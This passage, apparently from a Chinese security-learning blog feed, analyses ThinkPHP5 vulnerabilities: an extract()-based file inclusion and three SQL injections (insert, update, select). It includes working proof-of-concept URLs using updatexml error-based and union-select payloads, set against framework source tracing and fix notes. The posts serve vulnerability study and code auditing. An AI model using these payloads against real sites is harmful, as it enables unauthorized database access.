class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">$auth = <span class="string">&#x27;0&#x27;</span>;</span><br><span class="line">extract($_GET)；</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>($auth==<span class="number">1</span>)&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;private!&quot;</span>;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;public!&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><strong>这种情况没有指定 flags，则被假定为 EXTR_OVERWRITE</strong></p><p>假设用户构造以下链接：<a href="http://www.a.com/test1.php?auth=1">http://www.a.com/test1.php?auth=1</a><br>界面上会打印出private！</p><p>安全的做法是确定register_globals=OFF后，在调用extract()时使用EXTR_SKIP保证已有变量不会被覆盖。<br>ps:<br>PHP extract() 函数从数组中把变量导入到当前的符号表中。对于数组中的每个元素，键名用于变量名，键值用于变量值。</p><h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><p><strong>5.0.0&lt;=ThinkPHP5&lt;=5.0.18</strong> 、<strong>5.1.0&lt;=ThinkPHP&lt;=5.1.10</strong> </p><h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>这里以<code>ThinkPHP 5.0.18</code>  进行分析。</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200916184327.png" alt="image-20200916153529187"></p><p>在历史<code>Releases</code> 信息中，找到了 <code>5.0.19</code> 中，改进了 模板引擎的一处可能的安全隐患。</p><p><code>/library/think/template/driver/File.php</code> 中的 <code>File</code> 类中的<code>read</code> 方法。</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200916185031.png" alt="image-20200916161144712"></p><ul><li>用户Get提交的数据都会通过<code>input</code> 方法获取数据，然后通过<code>filterValue</code> 方法进行过滤和强制类型转换。</li><li>在修改后的代码下断点，然后看方法调用和参数传递。如下图：</li></ul><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200916185043.png" alt="image-20200916163325855"></p><p>在<code>../application/index/index/controller/index.php</code> 中，代码如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">app</span>\<span class="title">index</span>\<span class="title">controller</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">Controller</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Index</span> <span class="keyword">extends</span> <span class="title">Controller</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">index</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;assign(request()-&gt;get());</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;fetch(); <span class="comment">// 当前模块/默认视图目录/当前控制器（小写）/当前操作（小写）.html</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>用户输入的数据被<code>get</code>方法获取，然后调用了<code>input</code>方法和递归调用<code>filterValue</code> 方法，并且该方法还会继续调用<code>filterExp</code> 方法对特殊字符进行过滤，然后返回给<code>$data</code></p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200916185108.png" alt="image-20200916165017001"></p><p>然后再调用<code>assign</code> 方法，返回处理后的数据。</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200916185121.png" alt="image-20200916171205436"></p><p>因此用户的数据输入，经过<code>get</code>方法和<code>assign</code>方法后，返回的内容为<code>cacheFile=favico.ico</code> ，然后程序继续调用<code>fetch</code>方法进行处理。</p><blockquote><p>fetch方法用于加载模板输出。这里如果我们没有指定模板名称，其会使用默认的文件作为模板，模板路径类似 <strong>当前模块/默认视图目录/当前控制器（小写）/当前操作（小写）.html</strong> ，如果默认路径模板不存在，程序就会报错。</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200916185135.png" alt="image-20200916183120261"></p><p>跟进到 <strong>Template</strong> 类的 <strong>fetch</strong> 方法，可以发现可控变量 <strong>$vars</strong> 赋值给 <strong>$this-&gt;data</strong> 并最终传入 <strong>File</strong> 类的 <strong>read</strong> 方法。而 <strong>read</strong> 方法中在使用了 <strong>extract</strong> 函数后，直接包含了 <strong>$cacheFile</strong> 变量。这里就是漏洞发生的关键原因（可以通过 <strong>extract</strong> 函数，直接覆盖 <strong>$cacheFile</strong> 变量，因为 <strong>extract</strong> 函数中的参数 <strong>$vars</strong> 可以由用户控制）。</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200916185154.png" alt="image-20200916184005912"></p><p>方法调用栈：</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200916185205.png" alt="image-20200916184215051"></p><h2 id="利用总结"><a href="#利用总结" class="headerlink" title="利用总结"></a>利用总结</h2><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200916185135.png" alt="image-20200916183120261"></p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200916185825.png" alt="7"></p><h2 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h2><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200916185031.png" alt="image-20200916161144712"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;[toc]&lt;/p&gt;
&lt;h2 id=&quot;ThinkPHP5文件包含漏洞&quot;&gt;&lt;a href=&quot;#ThinkPHP5文件包含漏洞&quot; class=&quot;headerlink&quot; title=&quot;ThinkPHP5文件包含漏洞&quot;&gt;&lt;/a&gt;ThinkPHP5文件包含漏洞&lt;/h2&gt;&lt;h2 id=&quot;</summary>
      
    
    
    
    
    <category term="代码审计" scheme="https://hack-for.fun/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
    <category term="文件包含" scheme="https://hack-for.fun/tags/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/"/>
    
  </entry>
  
  <entry>
    <title>ThinkPHP5漏洞学习-SQL注入</title>
    <link href="https://hack-for.fun/69fea760.html"/>
    <id>https://hack-for.fun/69fea760.html</id>
    <published>2020-09-13T05:40:27.000Z</published>
    <updated>2021-03-25T13:26:54.210Z</updated>
    
    <content type="html"><![CDATA[<p>[toc]</p><p>参考资料：<a href="https://github.com/Mochazz/ThinkPHP-Vuln">https://github.com/Mochazz/ThinkPHP-Vuln</a></p><p>环境准备：</p><ul><li>PHPStorm + MAMP PRO</li></ul><p>环境搭建可以看我前两篇文章。</p><ul><li>composer</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">brew install composer</span><br><span class="line">composer config -g repo.packagist composer https:&#x2F;&#x2F;mirrors.aliyun.com&#x2F;composer&#x2F;</span><br></pre></td></tr></table></figure><ul><li>获取复现代码</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">composer create-project --prefer-dist topthink&#x2F;think&#x3D;5.0.15 tpdemo</span><br></pre></td></tr></table></figure><p>将 <strong>composer.json</strong> 文件的 <strong>require</strong> 字段设置成如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&quot;require&quot;: &#123;</span><br><span class="line">    &quot;php&quot;: &quot;&gt;&#x3D;5.4.0&quot;,</span><br><span class="line">    &quot;topthink&#x2F;framework&quot;: &quot;5.0.15&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>SQL 注入demo 环境</li></ul><p>修改<code>/application/index/controller/index.php</code> 的代码如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">app</span>\<span class="title">index</span>\<span class="title">controller</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Index</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">index</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $username = request()-&gt;get(<span class="string">&#x27;username/a&#x27;</span>);</span><br><span class="line">        db(<span class="string">&#x27;users&#x27;</span>)-&gt;insert([<span class="string">&#x27;username&#x27;</span> =&gt; $username]);</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;Update success&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>模拟这里存在一个用户传参并与数据库交互的场景。</p></blockquote><p>可能会存在，SQL 报错</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200913191229.png" alt="image-20200913135221064"></p><p>修改username 字段默认为<code>NULL</code>  即可解决问题。</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200913191250.png" alt="image-20200913134825568"></p><h1 id="SQL注入一-insert"><a href="#SQL注入一-insert" class="headerlink" title="SQL注入一(insert)"></a>SQL注入一(insert)</h1><h2 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">public&#x2F;index&#x2F;index?username[0]&#x3D;inc&amp;username[1]&#x3D;updatexml(1,concat(0x7,user(),0x7e),1)&amp;username[2]&#x3D;1 </span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200913191832.png" alt="image-20200913134332556"></p><h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><p><strong>5.0.13&lt;=ThinkPHP&lt;=5.0.15</strong> 、 <strong>5.1.0&lt;=ThinkPHP&lt;=5.1.5</strong></p><h2 id="漏洞概述"><a href="#漏洞概述" class="headerlink" title="漏洞概述"></a>漏洞概述</h2><p>本次漏洞存在于 <strong>Builder</strong> 类的 <strong>parseData</strong> 方法中。由于程序没有对数据进行很好的过滤，将数据拼接进 <strong>SQL</strong> 语句，导致 <strong>SQL注入漏洞</strong> 的产生。</p><p>类型：<code>insert</code> 注入。</p><h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><blockquote><p>对于开源项目，在issue 或者 commit \ Releases 记录中，就能找到历史漏洞信息。这一点在CTF中经常用到，尤其是Node.js 的第三方依赖漏洞。</p></blockquote><p>从漏洞影响版本可以去找 已经修复后的版本，<a href="https://github.com/top-think/framework/releases/tag/v5.0.16">https://github.com/top-think/framework/releases/tag/v5.0.16</a></p><p>通过github 的<code>compare</code>功能，即可查看代码发生了哪些修改。</p><p><a href="https://github.com/top-think/framework/compare/v5.0.16...master">https://github.com/top-think/framework/compare/v5.0.16...master</a></p><p>在<code>/thinkphp/library/think/db/Connection.php</code> 的 314， 316 行下断点Debug，打payload。</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200913191848.png" alt="image-20200913141903209"></p><p>INSERT INTO <code>users</code> (<code>username</code>) VALUES (updatexml(1,concat(0x7,user(),0x7e),1)+1) </p><p>同时成功攻击的Payload 所在的参数位于 <code>username[1]</code> 的 <code>value</code>  。</p><p>攻击Payload 经过ThinkPHP 的内置过滤后，进入<code>$this-&gt;builder</code> 的<code>Query</code> 类的<code>insert</code> 方法，执行其中的SQL语句，并在后面返回出了执行结果。因为Payload利用<code>updatexml()</code>来报错，因此必须开启<code>app_debug</code> 来开启SQL 报错信息。</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200913192007.png" alt="image-20200913155142684"></p><p>(如上图debug 结果中Query.php），<code>$this-&gt;builder</code> 为 <code>think\db\builder\Mysql</code> 类，<code>Query</code> 的定义位于 <code>thinkphp/library/think/db/builder/Mysql.php</code> </p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200913192026.png" alt="image-20200913161424839"></p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200913192043.png" alt="image-20200913161552092"></p><p>在<code>/thinkphp/library/think/db/builder/Mysql.php</code> , <code>Mysql</code> 类继承于<code>Builder</code> 类，即上面的 <strong>$this-&gt;builder-&gt;insert()</strong> 最终调用的是 <strong>Builder</strong> 类的 <strong>insert</strong> 方法</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200913192059.png" alt="image-20200913162209236"></p><p>方法调用<code>parseData()</code>方法来分析并处理数据，跟进该方法。</p><p><code>/thinkphp/library/think/db/Builder.php</code> </p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200913193005.png" alt="image-20200913163148214"></p><p>在<code>inc</code> 和 <code>dec</code> 的 情况下，将可控数据<code>$val[1]</code>通过<code>parseKey</code>方法处理后，进行拼接，并返回<code>$result</code></p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200913192945.png" alt="image-20200913185951795"></p><p><code>parseKey</code>方法 不做任何处理，是直接返回值的一个方法。</p><blockquote><p>因此，带有恶意SQL 语句的Payload，被拼接且没任何字符串形式处理在Builder类的insert方法中，通过str_replace函数直接替换，返回sql，带入SQL语句中被执行，造成了SQL注入漏洞。</p></blockquote><p>在<code>thinkphp/library/think/Request.php</code> 中，有调用内置过滤（直接替换为空）方法，对参数<code>exp</code>进行过滤，在case <code>exp</code>的情况下，无法造成漏洞。</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200913192928.png" alt="carbon"></p><p>问题：为什么不能将恶意Payload 用<code>username[2]</code> 来投递？</p><p>原因：</p><p>同样的办法，下断点，debug 可以看到。</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200913192915.png" alt="image-20200913181025221"></p><p>回到之前的<code>parseDate</code> 方法，<code>username[2]</code>的值通过<code>floatval</code>函数处理</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200913192902.png" alt="image-20200913171023035"></p><p>payload 变为了<code>0</code> ，且 会存在SQL 错误。</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200913192852.png" alt="image-20200913182241348"></p><h2 id="利用总结"><a href="#利用总结" class="headerlink" title="利用总结"></a>利用总结</h2><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200913192749.png" alt="image-20200913185834897"></p><h2 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h2><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200913192803.png" alt="image-20200913151252661"></p><h1 id="SQL注入二-update"><a href="#SQL注入二-update" class="headerlink" title="SQL注入二(update)"></a>SQL注入二(update)</h1><p>复现代码获取：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">composer create-project --prefer-dist topthink&#x2F;think&#x3D;5.1  tpdemo3</span><br></pre></td></tr></table></figure><p>将 <strong>composer.json</strong> 文件的 <strong>require</strong> 字段设置成如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&quot;require&quot;: &#123;</span><br><span class="line">    &quot;php&quot;: &quot;&gt;&#x3D;5.6.0&quot;,</span><br><span class="line">    &quot;topthink&#x2F;framework&quot;: &quot;5.1.7&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在<code>../config/app.php</code> 中，需要修改<code>app_trace</code> 为true， <code>app_debug</code> 默认开启了。</p><p>创建数据库：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">create database tpdemo;</span><br><span class="line">use tpdemo;</span><br><span class="line">create table users(</span><br><span class="line">id int primary key auto_increment,</span><br><span class="line">username varchar(50) not null</span><br><span class="line">);</span><br><span class="line">insert into users(id,username) values(1,&#39;testuser&#39;);</span><br></pre></td></tr></table></figure><p>这里也要设置username 字段 为<code>NULL</code> 才行</p><p>修改<code>/application/index/controller/index.php</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">app</span>\<span class="title">index</span>\<span class="title">controller</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Index</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">index</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $username = request()-&gt;get(<span class="string">&#x27;username/a&#x27;</span>);</span><br><span class="line">        db(<span class="string">&#x27;users&#x27;</span>)-&gt;where([<span class="string">&#x27;id&#x27;</span> =&gt; <span class="number">1</span>])-&gt;update([<span class="string">&#x27;username&#x27;</span> =&gt; $username]);</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;Update success&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="POC-1"><a href="#POC-1" class="headerlink" title="POC"></a>POC</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;public&#x2F;index&#x2F;index?username[0]&#x3D;point&amp;username[1]&#x3D;1&amp;username[2]&#x3D;updatexml(1,concat(0x7,user(),0x7e),1)^&amp;username[3]&#x3D;0</span><br></pre></td></tr></table></figure><p>很SQL 注入一非常类似。</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200914203133.png" alt="image-20200914152750668"></p><h2 id="影响版本-1"><a href="#影响版本-1" class="headerlink" title="影响版本"></a>影响版本</h2><p>漏洞影响版本： <strong>5.1.6&lt;=ThinkPHP&lt;=5.1.7</strong> (非最新的 <strong>5.1.8</strong> 版本也可利用)。</p><h2 id="漏洞概述-1"><a href="#漏洞概述-1" class="headerlink" title="漏洞概述"></a>漏洞概述</h2><p>本次漏洞存在于 <strong>Mysql</strong> 类的 <strong>parseArrayData</strong> 方法中由于程序没有对数据进行很好的过滤，将数据拼接进 <strong>SQL</strong> 语句，导致 <strong>SQL注入漏洞</strong> 的产生</p><p>注入类型：<code>update</code> 注入</p><h2 id="漏洞分析-1"><a href="#漏洞分析-1" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><blockquote><p>对于开源项目，在issue 或者 commit \ Releases 记录中，就能找到历史漏洞信息。这一点在CTF中经常用到，尤其是Node.js 的第三方依赖漏洞。</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200914203118.png" alt="image-20200914161022479"></p><ul><li>下断点，debug。观察参数传递过程</li><li>监控MySQL</li></ul><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200914203111.png" alt="image-20200914184917592"></p><hr><p>下断点，开启Debug，打Payload。</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200914202218.png" alt="image-20200914173011583"></p><p><code>../thinkphp/library/think/db/Query.php</code> 中，Payload 传入Query 类的 <code>update</code>方法，跟进该方法，该方法调用了<code>Connection</code> 类的该方法为<code>update</code>方法，该方法又调用了 </p><p><code>$this-&gt;builder</code> 的<code>update</code> 方法，此处的<code>$this-&gt;builder</code> 为为<code>think\db\builder\Mysql</code> 类。<code>class Mysql extends Builder</code> ，该类继承于<code>Builder</code> 类。</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200914202201.png" alt="image-20200914170732409"></p><p>在<code>Builder</code>类中的<code>update</code>方法，调用了<code>parseData</code>方法，（正如上图debug结果。</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200914202036.png" alt="image-20200914184754350"></p><p>在该方法中的<code>swich</code>语句中，之前出现过漏洞，现在多了一条default 语句。而在新版本中被删除了。</p><p>跟进到<code>parseData</code> 方法，发现Payload 又被<code>parseArrayData</code>方法处理，继续跟进，</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200914202026.png" alt="image-20200914185836504"></p><p>在<code>../thinkphp/library/think/db/builder/Mysql.php</code> 中的 200 行返回result 的地方打断点，调试结果如下。</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200914202011.png"></p><p>此处将可控变量经过拼接后被带入数据库进行查询。</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200914201959.png" alt="image-20200914193548748"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">parseArrayData</span>(<span class="params">Query $query, $data</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">list</span>($type, $value) = $data;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">switch</span> (strtolower($type)) &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;point&#x27;</span>:</span><br><span class="line">            $fun   = <span class="keyword">isset</span>($data[<span class="number">2</span>]) ? $data[<span class="number">2</span>] : <span class="string">&#x27;GeomFromText&#x27;</span>;</span><br><span class="line">            $point = <span class="keyword">isset</span>($data[<span class="number">3</span>]) ? $data[<span class="number">3</span>] : <span class="string">&#x27;POINT&#x27;</span>;</span><br><span class="line">            <span class="keyword">if</span> (is_array($value)) &#123;</span><br><span class="line">                $value = implode(<span class="string">&#x27; &#x27;</span>, $value);</span><br><span class="line">            &#125;</span><br><span class="line">            $result = $fun . <span class="string">&#x27;(\&#x27;&#x27;</span> . $point . <span class="string">&#x27;(&#x27;</span> . $value . <span class="string">&#x27;)\&#x27;)&#x27;</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            $result = <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> $result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其中：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$result = $fun . <span class="string">&#x27;(\&#x27;&#x27;</span> . $point . <span class="string">&#x27;(&#x27;</span> . $value . <span class="string">&#x27;)\&#x27;)&#x27;</span>;</span><br></pre></td></tr></table></figure><p>三个变量均可控。形式为：<code>$a(&#39;$b($c)&#39;)</code> </p><blockquote><p>现在就是想办法如何闭合，然后进行注入攻击。</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">UPDATE &#96;users&#96;  SET &#96;username&#96; &#x3D; $a(&#39;$b($c)&#39;)  WHERE  &#96;id&#96; &#x3D; 1;</span><br></pre></td></tr></table></figure><p>即让<code>$fun</code> 为我们的恶意Payload 即可。然后闭合掉后面的部分。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">updatexml(1,concat(0x7,user(),0x7e),1)^(&#39;0(1)&#39;)</span><br></pre></td></tr></table></figure><h2 id="利用总结-1"><a href="#利用总结-1" class="headerlink" title="利用总结"></a>利用总结</h2><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200914201929.png" alt="carbon"></p><p>下图来自参考资料。</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200914201900.png" alt="8"></p><h2 id="漏洞修复-1"><a href="#漏洞修复-1" class="headerlink" title="漏洞修复"></a>漏洞修复</h2><p>升级最新版，</p><p>官方直接删了<code>parseArrayDate</code> 函数。</p><blockquote><p>一点点感想，我感觉按照这个师傅的分析思路，是逆着payload 去分析的漏洞原因，我好想正面直接挖啊，菜死了。</p></blockquote><h1 id="SQL注入三-select"><a href="#SQL注入三-select" class="headerlink" title="SQL注入三(select)"></a>SQL注入三(select)</h1><p>新增参考资料：<a href="https://www.cnblogs.com/wangtanzhi/p/12732557.html">https://www.cnblogs.com/wangtanzhi/p/12732557.html</a></p><blockquote><p>学习就是要学习不同大佬的思路，然后转换为自己的思路。</p></blockquote><h2 id="POC-2"><a href="#POC-2" class="headerlink" title="POC"></a>POC</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;public&#x2F;index.php&#x2F;index&#x2F;index&#x2F;?username&#x3D;)%20union%20select%20updatexml(1,concat(0x7,user(),0x7e),1)%23</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200915105138.png" alt="image-20200914214213065"></p><p>sqlmap 也可以跑出结果。</p><h2 id="影响版本-2"><a href="#影响版本-2" class="headerlink" title="影响版本"></a>影响版本</h2><p>ThinkPHP5 全版本</p><h2 id="漏洞概述-2"><a href="#漏洞概述-2" class="headerlink" title="漏洞概述"></a>漏洞概述</h2><p>本次漏洞存在于 <strong>Mysql</strong> 类的 <strong>parseWhereItem</strong> 方法中。由于程序没有对数据进行很好的过滤，将数据拼接进 <strong>SQL</strong> 语句，导致 <strong>SQL注入漏洞</strong> 的产生。</p><h2 id="漏洞分析-2"><a href="#漏洞分析-2" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><ul><li>MySQL 监控</li></ul><blockquote><p>监控不到，不知道为什么。配置也是正确的。</p></blockquote><p><code>/application/index/controller/index.php</code></p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200915105308.png" alt="image-20200914220015121"></p><blockquote><p>然后用户输入的数据会原样进入框架的 SQL 查询方法中。首先程序先调用 Query 类的 where 方法，通过其 parseWhereExp 方法分析查询表达式，然后再返回并继续调用 select 方法准备开始构建 select 语句。（这个点得记住，框架的sql查询方法先进入 Query 类）</p></blockquote><hr><blockquote><p>程序默认调用 <strong>Request</strong> 类的 <strong>get</strong> 方法中会调用该类的 <strong>input</strong> 方法，但是该方法默认情况下并没有对数据进行很好的过滤，所以用户输入的数据会原样进入框架的 <strong>SQL</strong> 查询方法中。首先程序先调用 <strong>Query</strong> 类的 <strong>where</strong> 方法，通过其 <strong>parseWhereExp</strong> 方法分析查询表达式，然后再返回并继续调用 <strong>select</strong> 方法准备开始构建 <strong>select</strong> 语句。</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200915105416.png" alt="image-20200914222945520"></p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200915105701.png" alt="image-20200914224146213"></p><p>此处调用<code>$this-&gt;builder</code>的<code>select</code>方法。而此处<code>$this-&gt;builder</code> 为<code>think/db/builder/Mysql</code> 类，继承于<code>Builder</code> 类。因此调用的是<code>Builder</code>类的<code>select</code> 方法</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200915105718.png" alt="image-20200914225616763"></p><p>在 <strong>select</strong> 方法中，程序会对 <strong>SQL</strong> 语句模板用变量填充，其中用来填充 <strong>%WHERE%</strong> 的变量中存在用户输入的数据。跟进这个 <strong>where</strong> 分析函数，会发现其会调用生成查询条件 <strong>SQL</strong> 语句的 <strong>buildWhere</strong> 函数。</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200915105734.png" alt="image-20200914231827114"></p><p>此处<code>$where</code> 经过 <code>buildWhere</code> 